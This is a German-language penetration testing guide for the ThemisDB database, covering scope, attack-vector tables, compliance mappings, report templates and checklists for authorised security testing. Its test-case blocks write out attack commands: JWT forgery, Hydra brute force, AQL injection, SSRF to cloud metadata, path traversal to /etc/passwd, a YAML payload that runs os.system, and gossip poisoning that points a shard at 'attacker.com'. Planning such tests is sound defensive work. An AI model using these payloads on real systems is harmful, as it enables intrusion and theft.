# ThemisDB Penetration Testing Guide

**Version:** 1.0  
**Status:** Vorbereitung  
**Klassifikation:** Vertraulich  
**Autor:** ThemisDB Security Team  
**Datum:** Dezember 2025

---

## 1. Executive Summary

Dieses Dokument beschreibt die Vorbereitung und Durchführung eines Penetrationstests für ThemisDB. Es identifiziert Angriffsvektoren, definiert den Testumfang und liefert Checklisten für interne und externe Sicherheitsprüfungen.

### 1.1 Testumfang

| Komponente | In-Scope | Begründung |
|------------|----------|------------|
| REST API | ✅ | Hauptangriffsfläche |
| Authentication/RBAC | ✅ | Kritisch für Zugriffskontrolle |
| Encryption (AES-256-GCM) | ✅ | Datenschutz |
| TLS/mTLS | ✅ | Transportverschlüsselung |
| Plugin-System | ✅ | Code-Injection-Risiko |
| Admin-APIs | ✅ | Privilegierte Operationen |
| Sharding/Gossip | ✅ | Cluster-Kommunikation |
| Client SDKs | ⚠️ | Begrenzt (Code-Review) |
| Third-Party Dependencies | ⚠️ | SBOM-basiert |
| Hardware (HSM) | ❌ | Separater Test |
| Cloud-Infrastruktur | ❌ | Separater Test |

---

## 2. Angriffsvektoren-Analyse

### 2.1 STRIDE-Klassifikation

| Kategorie | Beschreibung | Risiko | Relevante Komponenten |
|-----------|--------------|--------|----------------------|
| **S**poofing | Identitätsdiebstahl | Hoch | Auth, JWT, mTLS |
| **T**ampering | Datenmanipulation | Hoch | API, Storage, Audit |
| **R**epudiation | Abstreitbarkeit | Mittel | Audit-Logs |
| **I**nformation Disclosure | Datenleck | Hoch | Encryption, Logs |
| **D**enial of Service | Verfügbarkeit | Mittel | Rate Limiting |
| **E**levation of Privilege | Rechteausweitung | Kritisch | RBAC, Admin-APIs |

### 2.2 Detaillierte Angriffsvektoren

#### 2.2.1 Authentication & Authorization (KRITISCH)

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| AUTH-001 | JWT Token Forgery | 9.8 | Manipulation des JWT-Tokens | Burp Suite, jwt_tool |
| AUTH-002 | JWT Algorithm Confusion | 9.1 | HS256/RS256 Verwechslung | Custom Script |
| AUTH-003 | JWT None Algorithm | 10.0 | Deaktivierter Algorithmus | jwt_tool |
| AUTH-004 | Session Fixation | 7.5 | Session-ID Übernahme | Manual Testing |
| AUTH-005 | Credential Stuffing | 6.5 | Bekannte Passwort-Listen | Hydra, Burp |
| AUTH-006 | Brute Force | 5.3 | Passwort-Raten | Hydra, Custom |
| AUTH-007 | RBAC Bypass | 8.8 | Umgehung der Rollenprivilege | Manual Testing |
| AUTH-008 | IDOR | 6.5 | Insecure Direct Object Reference | Burp Suite |
| AUTH-009 | mTLS Certificate Bypass | 8.1 | Falsches Client-Zertifikat | OpenSSL, Custom |
| AUTH-010 | API Key Leakage | 7.5 | Schlüssel in Logs/Responses | grep, Manual |

**Testfälle:**
```bash
# AUTH-001: JWT Token Manipulation
jwt_tool <token> -T -S hs256 -p ''

# AUTH-003: None Algorithm Attack
jwt_tool <token> -X a

# AUTH-006: Brute Force Login
hydra -l admin -P rockyou.txt https://target/api/v1/auth -t 4

# AUTH-007: RBAC Bypass
curl -H "Authorization: Bearer <user_token>" \
     https://target/api/v1/admin/users
```

#### 2.2.2 API Security

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| API-001 | SQL Injection (AQL) | 9.8 | AQL Query Injection | sqlmap, Manual |
| API-002 | NoSQL Injection | 9.8 | JSON Query Manipulation | nosqli, Manual |
| API-003 | SSRF | 8.6 | Server-Side Request Forgery | Burp Collaborator |
| API-004 | XXE | 7.5 | XML External Entity | Burp Suite |
| API-005 | Path Traversal | 7.5 | Dateisystem-Zugriff | dotdotpwn |
| API-006 | Command Injection | 9.8 | OS-Befehle ausführen | Commix |
| API-007 | Mass Assignment | 6.5 | Unerlaubte Feldänderungen | Manual Testing |
| API-008 | Rate Limit Bypass | 5.3 | DoS durch Umgehung | Custom Script |
| API-009 | GraphQL Introspection | 4.3 | Schema-Leak | GraphQL Voyager |
| API-010 | Batch Request Abuse | 5.3 | Ressourcen-Erschöpfung | Custom Script |

**Testfälle:**
```bash
# API-001: AQL Injection
curl -X POST https://target/api/v1/query/aql \
     -H "Content-Type: application/json" \
     -d '{"query": "FOR d IN collection FILTER d.id == \"1\" OR 1==1 RETURN d"}'

# API-003: SSRF
curl -X POST https://target/api/v1/import \
     -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# API-005: Path Traversal
curl https://target/api/v1/files/../../../etc/passwd
```

#### 2.2.3 Cryptography

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| CRYPT-001 | Weak TLS Config | 7.4 | TLS 1.0/1.1, schwache Cipher | testssl.sh |
| CRYPT-002 | Certificate Validation | 8.1 | Fehlende Cert-Prüfung | OpenSSL, Burp |
| CRYPT-003 | Encryption Oracle | 6.5 | Padding Oracle Attack | PadBuster |
| CRYPT-004 | Key in Memory | 6.5 | Schlüssel im Speicher | Volatility |
| CRYPT-005 | Predictable IV | 7.5 | Vorhersagbare Initialisierungsvektoren | Custom Analysis |
| CRYPT-006 | Timing Attack | 4.7 | Timing Side-Channel | Custom Script |
| CRYPT-007 | Hash Length Extension | 5.3 | SHA-256 Extension Attack | hash_extender |
| CRYPT-008 | Entropy Source | 5.9 | Schwache Zufallszahlen | Analysis |

**Testfälle:**
```bash
# CRYPT-001: TLS Configuration
testssl.sh --full https://target

# CRYPT-002: Certificate Chain
openssl s_client -connect target:443 -showcerts

# CRYPT-006: Timing Attack auf Auth
python timing_attack.py --target https://target/api/v1/auth
```

#### 2.2.4 Plugin System (Content Processors)

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| PLUG-001 | Malicious Plugin Upload | 9.8 | Code-Execution via Plugin | Custom DLL |
| PLUG-002 | DLL Hijacking | 7.8 | DLL Search Order | ProcMon |
| PLUG-003 | YAML Injection | 8.1 | Deserialization Attack | Custom YAML |
| PLUG-004 | Path Traversal in Config | 7.5 | Dateisystem-Zugriff | Manual |
| PLUG-005 | Resource Exhaustion | 6.5 | Memory/CPU via Plugin | Fuzzing |
| PLUG-006 | Signature Bypass | 8.8 | Plugin-Signatur umgehen | Custom |
| PLUG-007 | Sandbox Escape | 9.8 | Plugin-Isolation brechen | Custom |

**Testfälle:**
```yaml
# PLUG-003: YAML Deserialization Attack
plugin:
  name: !!python/object/apply:os.system
    - "id > /tmp/pwned"
```

#### 2.2.5 Cluster/Sharding Communication

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| CLUST-001 | Gossip Protocol Poison | 8.6 | Falsche Peer-Informationen | Custom Client |
| CLUST-002 | Split-Brain Exploit | 6.5 | Netzwerk-Partition ausnutzen | Network Tools |
| CLUST-003 | Shard Redirection | 7.5 | Traffic zu bösartigem Shard | MITM |
| CLUST-004 | Replay Attack | 6.5 | Wiederholung alter Messages | Custom |
| CLUST-005 | etcd Injection | 8.8 | Metadata Store Manipulation | etcdctl |

**Testfälle:**
```bash
# CLUST-001: Gossip Poisoning
python gossip_poison.py --target cluster:7946 \
       --inject '{"shard_id": "malicious", "endpoint": "attacker.com"}'

# CLUST-005: etcd Direct Access
etcdctl --endpoints=http://target:2379 get --prefix /themis/
```

#### 2.2.6 Data Exfiltration

| ID | Angriffsvektor | CVSS | Beschreibung | Testmethode |
|----|---------------|------|--------------|-------------|
| EXFIL-001 | Bulk Data Export | 7.5 | Massendaten-Extraktion | API Testing |
| EXFIL-002 | Backup Access | 8.1 | Zugriff auf Backups | File System |
| EXFIL-003 | Log Analysis | 5.3 | Sensitive Daten in Logs | grep, Manual |
| EXFIL-004 | Error Messages | 4.3 | Informationen in Fehlern | Manual |
| EXFIL-005 | Metadata Leak | 4.3 | Strukturinformationen | API Analysis |

---

## 3. Test-Infrastruktur

### 3.1 Benötigte Tools

```bash
# Automatisierte Scanner
apt install -y nmap nikto dirb gobuster

# Web Application Testing
# Burp Suite Pro (Commercial)
# OWASP ZAP (Open Source)

# API Testing
pip install httpx jwt-tool commix

# TLS Testing
apt install -y testssl.sh sslscan

# Custom Scripts
git clone https://github.com/themisdb/pentest-scripts
```

### 3.2 Test-Environment

```yaml
# docker-compose.pentest.yml
version: '3.8'

services:
  themis-target:
    image: themisdb/server:latest
    ports:
      - "8080:8080"
      - "8443:8443"
    environment:
      - THEMIS_ENV=pentest
      - THEMIS_LOG_LEVEL=debug
    volumes:
      - ./pentest-config:/etc/themis

  attacker:
    image: kalilinux/kali-rolling
    volumes:
      - ./tools:/tools
    command: tail -f /dev/null
```

---

## 4. Compliance Mapping

### 4.1 OWASP Top 10 (2021)

| OWASP | Kategorie | ThemisDB Vektoren | Status |
|-------|-----------|-------------------|--------|
| A01 | Broken Access Control | AUTH-007, AUTH-008, API-007 | 🔴 Test |
| A02 | Cryptographic Failures | CRYPT-* | 🔴 Test |
| A03 | Injection | API-001, API-002, API-006 | 🔴 Test |
| A04 | Insecure Design | - | 🟡 Review |
| A05 | Security Misconfiguration | CRYPT-001, PLUG-002 | 🔴 Test |
| A06 | Vulnerable Components | SBOM | 🟢 Automated |
| A07 | Auth Failures | AUTH-* | 🔴 Test |
| A08 | Software/Data Integrity | PLUG-001, PLUG-006 | 🔴 Test |
| A09 | Logging Failures | EXFIL-003 | 🔴 Test |
| A10 | SSRF | API-003 | 🔴 Test |

### 4.2 BSI C5 Mapping

| BSI C5 | Kontrolle | ThemisDB Test |
|--------|-----------|---------------|
| OPS-07 | Penetration Testing | Dieses Dokument |
| CRY-01 | Kryptographie | CRYPT-* |
| IDM-01 | Identitätsmanagement | AUTH-* |
| COM-01 | Kommunikationssicherheit | CLUST-*, CRYPT-001 |
| OPS-05 | Malware-Schutz | PLUG-001 |

---

## 5. Reporting Template

### 5.1 Finding Template

```markdown
## Finding: [ID] - [Titel]

**Severity:** Critical / High / Medium / Low / Info
**CVSS:** X.X
**Status:** Open / Confirmed / Fixed / False Positive

### Description
[Detaillierte Beschreibung der Schwachstelle]

### Impact
[Auswirkungen bei Ausnutzung]

### Proof of Concept
```
[Code/Commands zum Reproduzieren]
```

### Recommendation
[Empfohlene Gegenmaßnahme]

### References
- [Links zu CVEs, CWEs, etc.]
```

### 5.2 Executive Summary Template

```markdown
## Penetration Test Report - ThemisDB

**Test Date:** [Datum]
**Tester:** [Name/Firma]
**Version:** [ThemisDB Version]

### Summary

| Severity | Count |
|----------|-------|
| Critical | X |
| High     | X |
| Medium   | X |
| Low      | X |
| Info     | X |

### Top Findings
1. [Finding 1]
2. [Finding 2]
3. [Finding 3]

### Recommendations
1. [Priorität 1]
2. [Priorität 2]
```

---

## 6. Remediation Checklist

### 6.1 Vor dem Test

- [ ] Test-Environment aufsetzen (nicht Produktion!)
- [ ] Backup der Test-Daten erstellen
- [ ] Monitoring/Alerting temporär anpassen
- [ ] Stakeholder informieren
- [ ] Scope und Rules of Engagement dokumentieren
- [ ] Notfallkontakte bereitstellen

### 6.2 Nach dem Test

- [ ] Alle Test-Accounts deaktivieren
- [ ] Test-Daten bereinigen
- [ ] Findings priorisieren
- [ ] Remediation-Plan erstellen
- [ ] Re-Test planen
- [ ] Lessons Learned dokumentieren

---

## 7. Nächste Schritte

1. **Woche 1-2:** Internes Security Review
   - Code-Review kritischer Komponenten
   - Automatisierte Scans (SAST, DAST)
   - Dependency-Check (Snyk, Grype)

2. **Woche 3-4:** Externer Penetrationstest
   - Beauftragung eines spezialisierten Dienstleisters
   - Scope-Definition und Vertrag
   - Test-Durchführung

3. **Woche 5-6:** Remediation
   - Kritische/Hohe Findings beheben
   - Re-Test der Fixes
   - Dokumentation aktualisieren

4. **Woche 7-8:** Abschluss
   - Finaler Report
   - Management-Präsentation
   - Prozessverbesserungen

---

## Anhang A: Tool-Referenz

| Tool | Zweck | URL |
|------|-------|-----|
| Burp Suite | Web App Testing | portswigger.net |
| OWASP ZAP | Web App Testing | owasp.org/zap |
| testssl.sh | TLS Testing | testssl.sh |
| jwt_tool | JWT Analysis | github.com/ticarpi/jwt_tool |
| sqlmap | SQL Injection | sqlmap.org |
| Nmap | Port Scanning | nmap.org |
| Nikto | Web Scanner | cirt.net/Nikto2 |
| Hydra | Brute Force | github.com/vanhauser-thc/thc-hydra |

---

## Anhang B: Kontakte

| Rolle | Name | Kontakt |
|-------|------|---------|
| Security Lead | TBD | security@themisdb.io |
| DevOps | TBD | devops@themisdb.io |
| Incident Response | TBD | incident@themisdb.io |

---

**Dokument-Ende**

*Dieses Dokument ist vertraulich und nur für autorisierte Personen bestimmt.*
